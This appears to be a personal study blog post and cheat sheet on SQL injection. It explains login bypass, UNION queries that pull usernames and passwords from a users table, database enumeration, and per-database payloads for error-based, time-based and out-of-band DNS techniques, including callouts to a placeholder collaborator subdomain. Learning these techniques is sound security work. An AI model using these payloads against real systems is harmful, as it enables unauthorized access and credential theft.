---
layout: blog
type: blog
title: Web Application Security - SQL Injection
permalink: blog/web-sqli
# All dates must be YYYY-MM-DD format!
date: 2021-11-15
labels:
  - databases
  - sqlmap

---

# Vulnerabilities

## Retrieving hidden data

 Consider a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

```txt
https://insecure-website.com/products?category=Gifts
```

This causes the application to make an SQL query to retrieve details of the relevant products from the database:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
```

The restriction released = 1 is being used to hide products that are not released. For unreleased products, presumably released = 0.

```txt
https://insecure-website.com/products?category=Gifts'--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 
```

 Going further, an attacker can cause the application to display all the products in any category, including categories that they don't know about:

```txt
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

This results in the SQL query:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1 
```

## Subverting application logic

 Consider an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence `--` to remove the password check from the WHERE clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

This query returns the user whose username is administrator and successfully logs the attacker in as that user. 

## UNION attack

When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. 

 The UNION keyword lets you execute one or more additional SELECT queries and append the results to the original query. For example:

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query will return a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2. 

 For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out an SQL injection UNION attack, you need to ensure that your attack meets these two requirements. This generally involves figuring out:

- How many columns are being returned from the original query?
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

### Determining the number of columns required in an SQL injection UNION attack

#sqli_order_by
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:

`The ORDER BY position number 3 is out of range of the number of items in the select list.`

#sqli_union_select
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

 If the number of nulls does not match the number of columns, the database returns an error, such as:

`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

Note:
- The reason for using `NULL` as the values returned from the injected `SELECT` query is that the data types in each column must be compatible between the original and the injected queries. Since `NULL` is convertible to every commonly used data type, using `NULL` maximizes the chance that the payload will succeed when the column count is correct.
- On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like: `' UNION SELECT NULL FROM DUAL--`. #sqli_union_oracle
- The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

### Finding columns with a useful data type in an SQL injection UNION attack

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Using an SQL injection UNION attack to retrieve interesting data

#sqli_get_data
 When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the WHERE clause.
- The database contains a table called users with the columns username and password.

In this situation, you can retrieve the contents of the users table by submitting the input:

```sql
' UNION SELECT username, password FROM users-- 
```

### Retrieving multiple values within a single column

Use the string concatenation syntax of the database to combine the various columns into a single one

```sql
' UNION SELECT username || '~' || password FROM users-- 
```


## Examining the database

 it is often necessary to gather some information about the database itself. This includes the type and version of the database software, and the contents of the database in terms of which tables and columns it contains.
 
 ### Querying the database type and version

 You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.

The queries to determine the database version for some popular database types are in the Syntax table below.
 
 ### Listing contents of the database

  Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query information_schema.tables to list the tables in the database:

```sql
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = '<table_name>'
```

For Oracle

```sql
--You can list tables by querying all_tables:

SELECT table_name FROM all_tables

--And you can list columns by querying all_tab_columns:

SELECT column_name FROM all_tab_columns WHERE table_name = '<table_name>' 
```

## Blind SQL Injection
#coming


# Database Specific Syntax

## String concatenation

| DBMS | Syntax |
|---|---|
|Oracle	|	'foo'||'bar' |
|Microsoft | 'foo'+'bar' |
|PostgreSQL | 'foo'||'bar' |
|MySQL | 'foo' 'bar' [Note the space between the two strings] |
| | CONCAT('foo','bar') |

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string "ba". 

| DBMS | Syntax |
|---|---|
| Oracle | SUBSTR('foobar', 4, 2) |
| Microsoft | SUBSTRING('foobar', 4, 2) |
| PostgreSQL | SUBSTRING('foobar', 4, 2) |
| MySQL | SUBSTRING('foobar', 4, 2) |

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input. 

| DBMS | Syntax |
|---|---|
| Oracle | --comment |
| Microsoft | --comment |
| | /\*comment\*/ |
| PostgreSQL | --comment |
| | /\*comment\*/ |
| MySQL | '#comment' |
| | -- comment [Note the space after the double dash] |
| | /\*comment\*/ |

## Database version

| DBMS | Syntax |
|---|---|
| Oracle | SELECT banner FROM v$version |
| | SELECT version FROM v$instance |
| Microsoft | SELECT @@version |
| PostgreSQL | SELECT version() |
| MySQL | SELECT @@version |

## Database contents

| DBMS | Syntax |
|---|---|
| Oracle | SELECT * FROM all_tables |
| | SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' |
| Microsoft | SELECT * FROM information_schema.tables |
| | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| PostgreSQL | SELECT * FROM information_schema.tables |
| | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |
| MySQL | SELECT * FROM information_schema.tables |
| | SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE' |

## Conditional errors

| DBMS | Syntax |
|---|---|
| Oracle | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual |
| Microsoft | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END |
| MySQL | SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') |

## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay. 

| DBMS | Syntax |
|---|---|
| Oracle | Does not support batched queries. |
| Microsoft | QUERY-1-HERE; QUERY-2-HERE |
| PostgreSQL | QUERY-1-HERE; QUERY-2-HERE |
| MySQL | QUERY-1-HERE; QUERY-2-HERE |

Note:
With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database. 

## Time delays

| DBMS | Syntax |
|---|---|
| Oracle | dbms_pipe.receive_message(('a'),10) |
| Microsoft | WAITFOR DELAY '0:0:10' |
| PostgreSQL | SELECT pg_sleep(10) |
| MySQL | SELECT sleep(10) |

## Conditional time delays

| DBMS | Syntax |
|---|---|
| Oracle | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual |
| Microsoft | IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' |
| PostgreSQL | SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END |
| MySQL | SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') |

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred. 

| DBMS | Syntax |
|---|---|
| Oracle | The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence: SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual |
| | The following technique works on fully patched Oracle installations, but requires elevated privileges: SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net') |
| Microsoft | exec master..xp_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a' |
| PostgreSQL | copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |
| MySQL | The following techniques work on Windows only: \nLOAD_FILE('\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a') \nSELECT ... INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a' |

## DNS lookup with data exfiltration

| DBMS | Syntax |
|---|---|
| Oracle |  |
| Microsoft |  |
| PostgreSQL |  |
| MySQL |  |
